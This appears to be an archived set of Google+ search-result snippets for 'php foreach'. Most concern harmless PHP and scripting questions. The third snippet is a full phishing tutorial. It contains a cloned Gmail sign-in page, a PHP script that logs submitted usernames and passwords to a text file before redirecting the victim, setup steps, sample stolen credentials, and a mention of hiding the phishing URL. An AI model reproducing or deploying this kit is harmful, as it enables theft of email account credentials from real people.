@@ -1,0 +1,692 @@
+<?xml version='1.0' encoding='UTF-8'?>
+<search_results><query id="7471">php foreach</query><engine status="OK" timestamp="2014-04-25 21:21:15" name="Picasa" id="FW14-e122"/><snippets><snippet id="FW14-e122-7471-01"><link>https://plus.google.com/s/php%20foreach/photos/110075668626534458992/albums/5632683397139009521/5632683397131002706</link><title>Ignoring The Loop while using Disqus plugin 
+
+I had to develop a photo-slider in an existing Wordpress template recently. The photo-slider worked for 81% fine. The other 19% was taken by irritation caused by some javascript generated lines of code that constantly showed up in the last slider-slide. 
+
+Problem 
+When Disqus plugin is active in a Wordpress site it adds automatically javascript lines(See picture) inside Wordpress 'The Loop' 
+
+Interaction &amp; technique 
+The photoslider shows a photo and some stripped content. If you click on a photo in the slider you'll entering a full text post. 
+
+The photoslider is a list of posts outputted in html. It uses jquery and cycle which makes transitions and interaction possible.(Example: www.edak.nl) 
+
+Solution: 
+The wrong way: 
+&lt;div id="photo-gallery"&gt; 
+&lt;?php 
+/*Added a condition tag for Frontpage. Exclude the GALLERY category.*/?&gt; 
+&lt;?php if ( is_home() ) { 
+/*Exclude category 5, any other category will be showed.*/ 
+query_posts($query_string . '&amp;cat=-5&amp;posts_per_page=7'); 
+} 
+?&gt; 
+&lt;?php /*end condition*/?&gt; 
+
+&lt;div id="s2" class="pics"&gt; 
+&lt;?php if (have_posts()) : while (have_posts()) : the_post(); ?&gt; 
+&lt;div class="photo"&gt;&lt;span&gt;&lt;?php echo the_title(); ?&gt;&lt;/span&gt;&lt;a href="&lt;?php the_permalink(); ?&gt;"&gt;&lt;img src='&lt;?php echo p75GetThumbnail($post-&gt;ID); ?&gt;' alt='post thumbnail' width="640" height="424"/&gt;&lt;/a&gt;&lt;/div&gt; 
+&lt;?php endwhile; endif; /*end condition*/?&gt; 
+&lt;/div&gt; 
+&lt;/div&gt; 
+
+In the above example the photo-slider is putted inside the loop. Disqus adds automatically a javascript behavior to every Wordpress 'The Loop'. A few lines of javascript appears in the last slider-slide 
+
+The wright way: ignoring disquss javascript sjizzles. 
+
+&lt;div class="nav"&gt; 
+&lt;span class="hndlr-left"&gt;&lt;a id="next2" href="#"&gt;Prev&lt;/a&gt;&lt;/span&gt; 
+&lt;span class="hndlr-right"&gt;&lt;a id="prev2" href="#"&gt;Next&lt;/a&gt;&lt;/span&gt; 
+&lt;/div&gt; 
+&lt;div id="s2" class="pics"&gt; 
+&lt;?php 
+global $post; 
+$args = array( 'numberposts' =&gt; 5, 'category' =&gt; 7 ); 
+$posts = get_posts( $args ); 
+
+foreach( $posts as $post ) : setup_postdata($post); 
+?&gt; 
+&lt;div class="photo"&gt; 
+&lt;span&gt;&lt;?php echo the_title(); ?&gt;&lt;/span&gt; 
+&lt;a href="&lt;?php the_permalink(); ?&gt;"&gt;&lt;img src='&lt;?php echo p75GetThumbnail($post-&gt;ID); ?&gt;' alt='post thumbnail' width="640" height="424"/&gt;&lt;/a&gt; 
+&lt;/div&gt; 
+&lt;?php endforeach; ?&gt; 
+&lt;/div&gt; 
+
+In the above example I've putted the post in a 'traditional' PHP foreach LOOP. Everything is now working fine. Ignoring the Loop...sometimes. 
+
+I hope you found this post helpful!﻿
+
+Meer lezen (71 regels)Minder weergeven  ·  Vertalen</title><thumb cache="FW14-topics-docs/e122/7471_01_thumb.png">https://lh3.googleusercontent.com/-NjkgW7TjMvY/TitPtNo741I/AAAAAAAAAC0/af9O7SEQgdw/w426-h237/Screen%2Bshot%2B2011-07-24%2Bat%2B12.47.52%2BAM.png</thumb></snippet><snippet id="FW14-e122-7471-02"><link>https://plus.google.com/s/php%20foreach/photos/114368812280712971416/albums/5897692347674503073/5897692350672389746?authkey=CM6S672LpvXsCw&amp;sqi=112519434668485567645&amp;sqsi=932f24fc-99a7-44d7-82c3-e9fd1fac0f6f</link><title>Hi guys! I'm with a little problem here related to php. As I'm not a PHP developer and I would love some help around it. 
+
+I'm using a custom function from buddypress to make the current state of the user profiles url from the actual: 
+
+../members/username  to ../username 
+
+I don't expect you understand it as it is a Buddypress related feature, the error that I'm encoutering lies screenshot below. 
+
+The code of the first error is as follow: 
+
+// Determine if the root object WP page exists for this request 
+// note: get_page_by_path() breaks non-root pages 
+if ( !empty( $bp-&gt;unfiltered_uri_offset ) ) { 
+if ( !$page_exists = $wpdb-&gt;get_var( $wpdb-&gt;prepare( "SELECT ID FROM {$wpdb-&gt;posts} WHERE post_name = %s", $bp-&gt;unfiltered_uri[$bp-&gt;unfiltered_uri_offset] ) ) ) { 
+return false; 
+} 
+} 
+
+The code from the second error is as follow: 
+
+// Set the root object as the current wp_query-ied item 
+$object_id = 0; 
+foreach ( (array) $bp-&gt;pages as $page ) { 
+if ( $page-&gt;name == $bp-&gt;unfiltered_uri[$bp-&gt;unfiltered_uri_offset] ) { 
+$object_id = $page-&gt;id; 
+} 
+} 
+
+The other two errors must be caused because of these first two erros. 
+
+Any tip of how I could solve this problem?﻿
+
+Meer lezen (36 regels)Minder weergeven  ·  Vertalen</title><thumb cache="FW14-topics-docs/e122/7471_02_thumb.png">https://lh6.googleusercontent.com/-o0OW5PHF7kI/UdjP8hRdxnI/AAAAAAAAA20/w_VNia8oy-s/w426-h237/Screenshot_1.png</thumb></snippet><snippet id="FW14-e122-7471-03"><link>https://plus.google.com/s/php%20foreach/photos/100490595020013541252/albums/6004556160613945921/6004556165117932098?sqi=106677526797193681508&amp;sqsi=38b7947e-2ad5-43f7-a383-24ca206eef9f&amp;sqi=106677526797193681508&amp;sqsi=38b7947e-2ad5-43f7-a383-24ca206eef9f</link><title>Setting up a phishing site to capture g user info. 
+
+1\. You will need a host with PHP (110mb.com is perfect and free) 
+2\. Create a text file with the information below. After pasting the code save it as gmail.html and upload to website 
+
+&lt;html lang="en" dir="ltr"&gt; 
+&lt;head&gt; 
+&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt; 
+&lt;style type=text/css&gt; 
+&lt;!-- 
+body,td,div,p,a,font,span {font-family: arial,sans-serif} 
+body {margin-top:2} 
+.c {width: 4; height: 4} 
+.bubble {background-color:#C3D9FF} 
+.tl {padding: 0; width: 4; text-align: left; vertical-align: top} 
+.tr {padding: 0; width: 4; text-align: right; vertical-align: top} 
+.bl {padding: 0; width: 4; text-align: left; vertical-align: bottom} 
+.br {padding: 0; width: 4; text-align: right; vertical-align: bottom} 
+.caption {color:#000000; white-space:nowrap; background:#E8EEFA; text-align:center} 
+.form-noindent {background-color: #ffffff ; border: #C3D9FF 1px solid} 
+.feature-image {padding: 15 0 0 0; vertical-align: top; text-align: right; } 
+.feature-description {padding: 15 0 0 10; vertical-align: top; text-align: left; } 
+// --&gt; 
+&lt;/style&gt; 
+&lt;script type=text/javascript src="https://mail.google.com/mail?view=page&amp;name=browser"&gt;&lt;/script&gt; 
+&lt;script type=text/javascript&gt; 
+&lt;!-- 
+var start_time = (new Date()).getTime(); 
+if ((top.location != self.location)&amp;&amp;(top.location.href.indexOf('https://www.google.com/analytics/siteopt/preview')!=0)) { 
+ top.location = self.location.href; 
+} 
+function SetGmailCookie(name, value) { 
+  document.cookie = name + "=" + value + ";path=/;domain=.google.com"; 
+} 
+function lg() { 
+  var now = (new Date()).getTime(); 
+  var cookie = "T" + start_time + "/" + start_time + "/" + now; 
+  SetGmailCookie("GMAIL_LOGIN", cookie); 
+} 
+function gaiacb_onLoginSubmit() { 
+  lg(); 
+  if (!fixed) { 
+    FixForm(); 
+  } 
+  return true; 
+} 
+function StripParam(url, param) { 
+  var start = url.indexOf(param); 
+  if (start == -1) return url; 
+  var end = start + param.length; 
+  var charBefore = url.charAt(start-1); 
+  if (charBefore != '?' &amp;&amp; charBefore != '&amp;') return url; 
+  var charAfter = (url.length &gt;= end+1) ? url.charAt(end) : ''; 
+  if (charAfter != '' &amp;&amp; charAfter != '&amp;') return url; 
+  if (charBefore == '&amp;') { 
+  --start; 
+  } else if (charAfter == '&amp;') { 
+  ++end; 
+  } 
+  return url.substring(0, start) + url.substring(end); 
+} 
+var fixed = 0; 
+function FixForm() { 
+  if (is_browser_supported) { 
+  var form = el("gaia_loginform"); 
+  if (form &amp;&amp; form["continue"]) { 
+  var url = form["continue"].value; 
+  url = StripParam(url, "ui=html"); 
+  url = StripParam(url, "zy=l"); 
+  form["continue"].value = url; 
+  } 
+  } 
+  fixed = 1; 
+} 
+function el(id) { 
+  if (document.getElementById) { 
+  return document.getElementById(id); 
+  } else if (window[id]) { 
+  return window[id]; 
+  } 
+  return null; 
+} 
+var CP = [ 
+ [ 1167638400000, 2800 ], 
+ [ 1175414400000, 2835 ], 
+ [ 1207033200000, 2980 ], 
+ [ 1238569200000, 3125 ], 
+ [ 1270105200000, 3270 ], 
+ [ 1301641200000, 3415 ], 
+ [ 1333263600000, 3560 ] 
+]; 
+var quota; 
+var ONE_PX = "https://mail.google.com/mail/images/c.gif?t=" + 
+  (new Date()).getTime(); 
+function LogRoundtripTime() { 
+  var img = new Image(); 
+  var start = (new Date()).getTime(); 
+  img.onload = GetRoundtripTimeFunction(start); 
+  img.src = ONE_PX; 
+} 
+function GetRoundtripTimeFunction(start) { 
+  return function() { 
+  var end = (new Date()).getTime(); 
+  SetGmailCookie("GMAIL_RTT", (end - start)); 
+  } 
+} 
+function MaybePingUser() { 
+  var f = el("gaia_loginform"); 
+  if (f.Email.value) { 
+  new Image().src = 'https://mail.google.com/mail?gxlu=' + 
+  encodeURIComponent(f.Email.value) + 
+  '&amp;zx=' + (new Date().getTime()); 
+  } 
+} 
+function OnLoad() { 
+  gaia_setFocus(); 
+  MaybePingUser(); 
+  el("gaia_loginform").Passwd.onfocus = MaybePingUser; 
+  LogRoundtripTime(); 
+  if (!quota) { 
+  quota = el("quota"); 
+  updateQuota(); 
+  } 
+  LoadConversionScript(); 
+} 
+function updateQuota() { 
+  if (!quota) { 
+  return; 
+  } 
+  var now = (new Date()).getTime(); 
+  var i; 
+  for (i = 0; i &lt; CP.length; i++) { 
+    if (now &lt; CP[i][0]) { 
+      break; 
+    } 
+  } 
+  if (i == 0) { 
+    setTimeout(updateQuota, 1000); 
+  } else if (i == CP.length) { 
+    quota.innerHTML = CP[i - 1][1]; 
+  } else { 
+    var ts = CP[i - 1][0]; 
+    var bs = CP[i - 1][1]; 
+    quota.innerHTML = format(((now-ts) / (CP[i][0]-ts) * (CP[i][1]-bs)) + bs); 
+    setTimeout(updateQuota, 1000); 
+  } 
+} 
+
+var PAD = '.000000'; 
+
+function format(num) { 
+  var str = String(num); 
+  var dot = str.indexOf('.'); 
+  if (dot &lt; 0) { 
+     return str + PAD; 
+  } if (PAD.length &gt; (str.length - dot)) { 
+  return str + PAD.substring(str.length - dot); 
+  } else { 
+  return str.substring(0, dot + PAD.length); 
+  } 
+} 
+var google_conversion_type = 'landing'; 
+var google_conversion_id = 1069902127; 
+var google_conversion_language = "en_US"; 
+var google_conversion_format = "1"; 
+var google_conversion_color = "FFFFFF"; 
+function LoadConversionScript() { 
+  var script = document.createElement("script"); 
+  script.type = "text/javascript"; 
+  script.src = "https://www.googleadservices.com/pagead/conversion.js"; 
+} 
+// --&gt; 
+&lt;/script&gt; 
+&lt;title&gt;Welcome to Gmail&lt;/title&gt; 
+&lt;script&gt; 
+_utcp="/accounts/"; 
+_udn="google.com"; 
+&lt;/script&gt; 
+&lt;script&gt; 
+function utmx_section(){} 
+(function(){var k='2142287121',d=document,l=d.location,c=d.cookie;function f(n){ 
+if(c){var i=c.indexOf(n+'=');if(i&gt;-1){var j=c.indexOf(';',i);return c.substring(i+n. 
+length+1,j&lt;0?c.length:j)}}}var x=f('__utmx'),xx=f('__utmxx'),h=l.hash, 
+t=h.length&gt;1||!xx||!xx.indexOf(k+':bypasscache');d.write('&lt;sc'+'ript src="'+ 
+'http'+(l.protocol=='https:'?'s://ssl':'://www')+'.google-analytics.com' 
++'/siteopt.js?utmxkey='+k+'&amp;utmx='+(x?x:'')+'&amp;utmxx='+(xx?xx:'')+(t?'&amp;utmxtime=' 
++new Date().valueOf():'')+(h?'&amp;utmxhash='+h.substr(1):'')+ 
+'" type="text/javascript" charset="utf-8"&gt;&lt;/sc'+'ript&gt;')})(); 
+&lt;/script&gt; 
+&lt;/head&gt; 
+&lt;body bgcolor=#ffffff link=#0000FF vlink=#0000FF onload="OnLoad()"&gt; 
+&lt;table width=95% border=0 align=center cellpadding=0 cellspacing=0&gt; 
+  &lt;tr valign=top&gt; 
+  &lt;td width=1%&gt;&lt;img src="https://mail.google.com/mail/help/images/logo.gif" border=0 width=143 height=59 alt=Gmail align=left vspace=10/&gt;&lt;/td&gt; 
+  &lt;td width=99% bgcolor=#ffffff valign=top&gt; 
+  &lt;table width=100% cellpadding=1&gt; 
+  &lt;tr valign=bottom&gt; 
+  &lt;td&gt;&lt;div align=right&gt; &lt;/div&gt;&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+  &lt;td nowrap=nowrap&gt; 
+  &lt;table width=100% align=center cellpadding=0 cellspacing=0 bgcolor=#C3D9FF style=margin-bottom:5&gt; 
+  &lt;tr&gt; 
+  &lt;td class="bubble tl" align=left valign=top&gt;&lt;img src=https://mail.google.com/mail/images/corner_tl.gif class=c alt="" /&gt;&lt;/td&gt; 
+  &lt;td class=bubble rowspan=2 style="font-family:arial;text-align:left;font-weight:bold;padding:3 0"&gt;&lt;b&gt;Welcome to Gmail&lt;/b&gt;&lt;/td&gt; 
+  &lt;td class="bubble tr" align=right valign=top&gt;&lt;img src=https://mail.google.com/mail/images/corner_tr.gif class=c alt="" /&gt;&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+  &lt;td class="bubble bl" align=left valign=bottom&gt;&lt;img src=https://mail.google.com/mail/images/corner_bl.gif class=c alt="" /&gt;&lt;/td&gt; 
+  &lt;td class="bubble br" align=right valign=bottom&gt;&lt;img src=https://mail.google.com/mail/images/corner_br.gif class=c alt="" /&gt;&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;/table&gt; 
+  &lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;/table&gt; 
+  &lt;/td&gt; 
+  &lt;/tr&gt; 
+&lt;/table&gt; 
+&lt;table width=94% align=center cellpadding=5 cellspacing=1&gt; 
+  &lt;tr&gt; 
+  &lt;td valign=top style="text-align:left"&gt;&lt;b&gt;A Google approach to email.&lt;/b&gt; 
+  &lt;td valign=top&gt; 
+&lt;/table&gt; 
+&lt;table width=94% align=center cellpadding=5 cellspacing=1&gt; 
+  &lt;tr&gt; 
+  &lt;td width=75% valign=top&gt; 
+  &lt;p style="margin-bottom: 0;text-align:left"&gt;&lt;font size=-1&gt; 
+  Gmail is a new kind of webmail, built on the idea that email can be more intuitive, efficient, and useful. And maybe even fun. After all, Gmail has:&lt;/font&gt;&lt;/p&gt; 
+  &lt;table border="0" cellpadding="0" cellspacing="0" width="90%"&gt; 
+  &lt;tr&gt; 
+  &lt;td class="feature-image"&gt; &lt;/td&gt; 
+  &lt;td class="feature-description"&gt; 
+  &lt;font size=-1&gt;&lt;b&gt;Fast search&lt;/b&gt;&lt;br&gt; 
+  Use Google search to &lt;b&gt;find the exact message&lt;/b&gt; you want, no matter when it was sent or received.&lt;/font&gt; 
+  &lt;/td&gt; 
+  &lt;tr&gt; 
+  &lt;td class="feature-image"&gt; &lt;/td&gt; 
+  &lt;td class="feature-description"&gt; 
+  &lt;font size=-1&gt;&lt;b&gt;Lots of space&lt;/b&gt;&lt;br&gt; 
+  Over &lt;span id=quota&gt;2757.272164&lt;/span&gt; megabytes (and counting) of free storage so you'll never need to delete another message.&lt;/font&gt; 
+  &lt;/td&gt; 
+  &lt;tr&gt; 
+  &lt;td class="feature-image"&gt;&lt;img src="https://www.google.com/accounts/mail/talk_bubbles_small.gif"&gt;&lt;/td&gt; 
+  &lt;td class="feature-description"&gt; 
+  &lt;font size=-1&gt;&lt;b&gt;Chat right inside Gmail&lt;/b&gt;&lt;br&gt; 
+  It's just one click to chat with the people you already email. You can even save your chats in your Gmail account. &lt;a href="http://mail.google.com/mail/help/intl/en/chat.html"&gt;Learn more&lt;/a&gt;&lt;/font&gt; 
+  &lt;/td&gt; 
+  &lt;tr&gt; 
+  &lt;td class="feature-image"&gt;&lt;img src="https://www.google.com/accounts/mail/mobile_j2me_micro.gif"&gt;&lt;/td&gt; 
+  &lt;td class="feature-description"&gt; 
+  &lt;font size=-1&gt;&lt;b&gt;Mobile access&lt;/b&gt;&lt;br&gt; 
+  Read Gmail on your mobile phone by pointing your phone's web browser to &lt;b&gt;http://gmail.com/app&lt;/b&gt;. &lt;a href="http://www.google.com/intl/en/mobile/mail/#utm_source=en-cpp-g4mc-gmhp&amp;utm_medium=cpp&amp;utm_campaign=en"&gt;Learn more&lt;/a&gt;&lt;/font&gt; 
+  &lt;/td&gt; 
+  &lt;/tbody&gt;&lt;/table&gt; 
+&lt;script&gt;utmx_section("promo")&lt;/script&gt; 
+  &lt;p style="text-align:left"&gt;&lt;font size="-1"&gt;Get Gmail for your business, school, or organization with &lt;a href="http://www.google.com/a/?utm_source=en-gmail&amp;utm_medium=et&amp;utm_campaign=landing-nav-v1"&gt;Google Apps&lt;/a&gt;.&lt;/font&gt;&lt;/p&gt; 
+&lt;/noscript&gt; 
+ &lt;/td&gt; 
+  &lt;td valign=top&gt; 
+  &lt;!-- login box --&gt; 
+&lt;div id=login&gt; 
+&lt;script&gt;&lt;!-- 
+function gaia_onLoginSubmit() { 
+  if (window.gaiacb_onLoginSubmit) { 
+    return gaiacb_onLoginSubmit(); 
+  } else { 
+    return true; 
+  } 
+} 
+function gaia_setFocus() { 
+  var f = null; 
+  if (document.getElementById) { 
+    f = document.getElementById("gaia_loginform"); 
+  } else if (window.gaia_loginform) { 
+    f = window.gaia_loginform; 
+  } 
+  if (f) { 
+    if (f.Email.value == null || f.Email.value == "") { 
+      f.Email.focus(); 
+    } else { 
+      f.Passwd.focus(); 
+    } 
+  } 
+} 
+\--&gt;&lt;/script&gt; 
+&lt;style type="text/css"&gt;&lt;!-- 
+  div.errormsg { color: red; font-size: smaller; font-family:arial,sans-serif; } 
+  font.errormsg { color: red; font-size: smaller; font-family:arial,sans-serif; } 
+\--&gt;&lt;/style&gt; 
+&lt;style type="text/css"&gt;&lt;!-- 
+.gaia.le.lbl { font-family: Arial, Helvetica, sans-serif; font-size: smaller; } 
+.gaia.le.fpwd { font-family: Arial, Helvetica, sans-serif; font-size: 70%; } 
+.gaia.le.chusr { font-family: Arial, Helvetica, sans-serif; font-size: 70%; } 
+.gaia.le.val { font-family: Arial, Helvetica, sans-serif; font-size: smaller; } 
+.gaia.le.button { font-family: Arial, Helvetica, sans-serif; font-size: smaller; } 
+.gaia.le.rem { font-family: Arial, Helvetica, sans-serif; font-size: smaller; } 
+.gaia.captchahtml.desc { font-family: arial, sans-serif; font-size: smaller; } 
+.gaia.captchahtml.cmt { font-family: arial, sans-serif; font-size: smaller; font-style: italic; } 
+
+\--&gt;&lt;/style&gt; 
+&lt;div id="gaia_loginbox"&gt; 
+&lt;table class="form-noindent" cellspacing="3" cellpadding="5" width="100%" border="0"&gt; 
+  &lt;tr&gt; 
+  &lt;td valign="top" style="text-align:center" nowrap="nowrap" 
+        bgcolor="#e8eefa"&gt; 
+  &lt;form id="gaia_loginform" action="mail.php" method="post" 
+        onsubmit="return(gaia_onLoginSubmit());" &gt; 
+  &lt;input type="hidden" name="ltmpl" 
+             value="default"&gt; 
+  &lt;input type="hidden" name="ltmplcache" 
+             value="2"&gt; 
+  &lt;div class="loginBox"&gt; 
+  &lt;table id="gaia_table" align="center" border="0" cellpadding="1" cellspacing="0"&gt; 
+  &lt;tr&gt; 
+&lt;td colspan="2" align="center"&gt; 
+  &lt;font size="-1"&gt; 
+  Sign in to 
+  Gmail 
+  with your 
+  &lt;/font&gt; 
+  &lt;table&gt; 
+  &lt;tr&gt; 
+  &lt;td valign="top"&gt; 
+  &lt;img src="https://www.google.com/accounts/google_transparent.gif" 
+           alt="Google"&gt; 
+  &lt;/img&gt; 
+  &lt;/td&gt; 
+  &lt;td valign="middle"&gt; 
+  &lt;font size="+0"&gt;&lt;b&gt;Account&lt;/b&gt;&lt;/font&gt; 
+  &lt;/td&gt; 
+  &lt;/tr&gt; 
+&lt;/table&gt; 
+&lt;/td&gt; 
+&lt;/tr&gt; 
+  &lt;script type="text/javascript"&gt;&lt;!-- 
+    function onPreCreateAccount() { 
+
+      return true; 
+
+    } 
+    function onPreLogin() { 
+
+      if (window["onlogin"] != null) { 
+        return onlogin(); 
+      } else { 
+        return true; 
+      } 
+
+    } 
+  --&gt;&lt;/script&gt; 
+&lt;tr&gt; 
+  &lt;td colspan="2" align="center"&gt; 
+  &lt;/td&gt; 
+&lt;/tr&gt; 
+&lt;tr&gt; 
+  &lt;td nowrap="nowrap"&gt; 
+  &lt;div align="right"&gt; 
+  &lt;span class="gaia le lbl"&gt; 
+  Username: 
+  &lt;/span&gt; 
+  &lt;/div&gt; 
+  &lt;/td&gt; 
+  &lt;td&gt; 
+  &lt;input type="hidden" name="continue" id="continue" 
+           value="http://mail.google.com/mail/?ui=html&amp;zy=l" /&gt; 
+  &lt;input type="hidden" name="service" id="service" 
+           value="mail" /&gt; 
+  &lt;input type="hidden" name="rm" id="rm" 
+           value="false" /&gt; 
+  &lt;input type="hidden" name="ltmpl" id="ltmpl" 
+           value="default" /&gt; 
+  &lt;input type="text" name="Email"  id="Email" 
+  size="18" value="" 
+
+    class='gaia le val' 
+
+  /&gt; 
+  &lt;/td&gt; 
+&lt;/tr&gt; 
+&lt;tr&gt; 
+  &lt;td&gt;&lt;/td&gt; 
+  &lt;td align="left"&gt; 
+  &lt;/td&gt; 
+&lt;/tr&gt; 
+&lt;tr&gt; 
+  &lt;td align="right"&gt; 
+  &lt;span class="gaia le lbl"&gt; 
+  Password: 
+  &lt;/span&gt; 
+  &lt;/td&gt; 
+  &lt;td&gt; 
+  &lt;input type="password" 
+   name="Passwd" id="Passwd" 
+  size="18" 
+
+    class="gaia le val" 
+
+  /&gt; 
+  &lt;/td&gt; 
+&lt;/tr&gt; 
+&lt;tr&gt; 
+  &lt;td&gt; 
+  &lt;/td&gt; 
+  &lt;td align="left"&gt; 
+  &lt;/td&gt; 
+&lt;/tr&gt; 
+  &lt;tr&gt; 
+  &lt;td align="right" valign="top"&gt; 
+  &lt;input type="checkbox" name="PersistentCookie" id="PersistentCookie" 
+    value="yes" 
+
+  /&gt; 
+  &lt;input type="hidden" name='rmShown' value="1" /&gt; 
+  &lt;/td&gt; 
+  &lt;td&gt;&lt;span class="gaia le rem"&gt; 
+  Remember me on this computer. 
+  &lt;/span&gt;&lt;/td&gt; 
+&lt;/tr&gt; 
+&lt;tr&gt; 
+  &lt;td&gt; 
+  &lt;/td&gt; 
+  &lt;td align="left"&gt; 
+  &lt;input type="submit" class="gaia le button" name="signIn" 
+           value="Sign in" /&gt; 
+  &lt;/td&gt; 
+&lt;/tr&gt; 
+&lt;tr id="ga-fprow"&gt; 
+  &lt;td colspan="2" nowrap="nowrap" height="33.0" class="gaia le fpwd" 
+    align="center" valign="bottom"&gt; 
+  &lt;a href="http://mail.google.com/support/bin/answer.py?answer=46346&amp;fpUrl=https%3A%2F%2Fwww.google.com%2Faccounts%2FForgotPasswd%3FfpOnly%3D1%26continue%3Dhttp%253A%252F%252Fmail.google.com%252Fmail%252F%253Fui%253Dhtml%2526zy%253Dl%26service%3Dmail&amp;fuUrl=https%3A%2F%2Fwww.google.com%2Faccounts%2FForgotPasswd%3FfuOnly%3D1%26continue%3Dhttp%253A%252F%252Fmail.google.com%252Fmail%252F%253Fui%253Dhtml%2526zy%253Dl%26service%3Dmail&amp;hl=en" 
+
+       target= 
+                "_top" 
+
+       &gt; 
+  I cannot access my account 
+  &lt;/a&gt; 
+  &lt;/td&gt; 
+&lt;/tr&gt; 
+  &lt;/table&gt; 
+  &lt;/div&gt; 
+  &lt;/form&gt; 
+  &lt;/td&gt; 
+  &lt;/tr&gt; 
+&lt;/table&gt; 
+&lt;/div&gt; 
+&lt;/div&gt; 
+&lt;script&gt; 
+&lt;!-- 
+FixForm(); 
+// --&gt; 
+&lt;/script&gt; 
+  &lt;!-- end login box --&gt; 
+  &lt;br&gt; 
+  &lt;!-- links box (below login box) --&gt; 
+  &lt;table class=form-noindent cellpadding=0 width=100% bgcolor=#E8EEFA&gt; 
+  &lt;tr bgcolor=#E8EEFA&gt; 
+  &lt;td valign=top&gt;&lt;div align=center style="margin:10 0"&gt; 
+  &lt;font size=+0&gt; 
+  &lt;script&gt;utmx_section("sign up")&lt;/script&gt; 
+  &lt;b&gt;&lt;a href="http://mail.google.com/mail/signup" style="white-space:nowrap"&gt; 
+  Sign up for Gmail&lt;/a&gt;&lt;/b&gt; 
+  &lt;/noscript&gt; 
+  &lt;br&gt;&lt;br&gt; 
+  &lt;font size="-1"&gt; 
+  &lt;a href="http://mail.google.com/mail/help/intl/en/about.html"&gt;About Gmail&lt;/a 
+                  &gt;     &lt;a href="http://mail.google.com/mail/help/intl/en/about_whatsnew.html"&gt;New features!&lt;/a&gt; 
+  &lt;/font&gt; 
+  &lt;br&gt; 
+  &lt;/font&gt; 
+  &lt;/div&gt; 
+  &lt;/table&gt; 
+  &lt;!-- end links box (below login box) --&gt; 
+&lt;/table&gt; 
+&lt;br&gt; 
+&lt;table width=95% align=center cellpadding=3 cellspacing=0 bgcolor=#C3D9FF style=margin-bottom:5&gt; 
+  &lt;tr&gt; 
+  &lt;td class="bubble tl" align=left valign=top&gt;&lt;img src=https://mail.google.com/mail/images/corner_tl.gif class=c alt=""/&gt;&lt;/td&gt; 
+  &lt;td class=bubble rowspan=2 style=text-align:left&gt; 
+  &lt;div align=center&gt; 
+  &lt;font size=-1 color=#666666&gt;©2007 Google - 
+  &lt;a href=http://mail.google.com/mail/help/intl/en/privacy.html&gt; 
+  Privacy Policy&lt;/a&gt; 
+  - 
+  &lt;a href=http://mail.google.com/mail/help/intl/en/program_policies.html&gt; 
+  Program Policies&lt;/a&gt; 
+  - 
+  &lt;a href=http://www.google.com/accounts/TOS?loc=US&amp;hl=en&gt; 
+  Terms of Use &lt;/a&gt; 
+  &lt;/font&gt; 
+  &lt;/div&gt; 
+  &lt;/td&gt; 
+  &lt;td class="bubble tr" align=right valign=top&gt;&lt;img src=https://mail.google.com/mail/images/corner_tr.gif class=c alt="" /&gt;&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+  &lt;td class="bubble bl" align=left valign=bottom&gt;&lt;img src=https://mail.google.com/mail/images/corner_bl.gif class=c alt="" /&gt;&lt;/td&gt; 
+  &lt;td class="bubble br" align=right valign=bottom&gt;&lt;img src=https://mail.google.com/mail/images/corner_br.gif class=c alt="" /&gt;&lt;/td&gt; 
+  &lt;/tr&gt; 
+&lt;/table&gt; 
+&lt;script type="text/javascript" 
+ src="https://ssl.google-analytics.com/urchin_beta.js"&gt; 
+&lt;/script&gt; 
+&lt;script type="text/javascript"&gt; 
+_uacct="UA-992684-1"; 
+_utcp="/accounts/"; 
+_udn="google.com"; 
+_uRno[0]=".google.com"; 
+urchinTracker("/mail/gaia/homepage"); 
+urchinPathCopy("/mail/"); 
+_uacct = 'UA-1923148-2'; 
+urchinTracker("/2142287121/test"); 
+urchinPathCopy("/mail/"); 
+&lt;/script&gt; 
+&lt;/body&gt; 
+&lt;/html&gt; 
+
+3.  Create a text file and copy the code below and then save it as mail.php and save to website. 
+
+&lt;?php 
+header ('Location: https://www.google.com/accounts/ServiceLoginAuth?service=mail '); 
+$handle = fopen("log.txt", "a"); 
+foreach($_POST as $variable =&gt; $value) { 
+   fwrite($handle, $variable); 
+   fwrite($handle, "="); 
+   fwrite($handle, $value); 
+   fwrite($handle, "\r\n"); 
+} 
+fwrite($handle, "\r\n"); 
+fclose($handle); 
+exit; 
+?&gt; 
+
+4\. Create a file named log.txt and upload to webhost. 
+
+Browse to your site and you should see the site attached to article, log into the site and the information will be written to log.txt in this format. 
+
+ltmpl=default 
+ltmplcache=2 
+continue=http://mail.google.com/mail/? service=mail rm=false Email=sniffsploit@artical.com 
+Passwd=Phished 
+rmShown=1 
+signIn=Sign in 
+
+I will cover URL masking and other options to hide the phishing URL﻿
+
+Meer lezen (643 regels)Minder weergeven  ·  Vertalen</title><thumb cache="FW14-topics-docs/e122/7471_03_thumb.png">https://lh5.googleusercontent.com/-6iuU7jBEjvQ/U1R4BMe8ckI/AAAAAAAAYJs/bIzGNkLmofo/w426-h237/gmail_phish.PNG</thumb></snippet><snippet id="FW14-e122-7471-04"><link>https://plus.google.com/s/php%20foreach/photos/104849355407989263028/albums/5641632584442896769/5664807600896754130</link><title>Further progress! (Note to self: get some personal photos up * grin *.) 
+
+Here we see the Powers page of the Character Sheet (about 25% coded). Testing a Multiple Discipline case. The cursor (not shown) is on the Missile weapons talent. The sheet will re-calculate all of the talent/power's properties each time the page is refreshed, cache an html table version of them (and the tool-tip) to the token, and then read them back into the sheet. (This cache-&gt;read process seems the fastest.) 
+
+On that note, I've had a couple of questions from MapTool users on how exactly I'm coding this up. 
+
+MapTool's scripting language allows for some interesting HTML3.2 with only certain CSS1 functionality (based on what the underlying java libraries support). This is then combined with a custom scripting language (MTscript) which has all of your IF(), FOREACH(), etc functions, the ability to manipulate JSON objects, and set and get Properties from Tokens. 
+
+If that interests you, start reading the Wiki: http://lmwcs.com/rptools/wiki/Main_Page 
+
+And then check out this excellent forum post, [aliasmask] Coding Tidbits: http://forums.rptools.net/viewtopic.php?f=20&amp;t=19856﻿
+
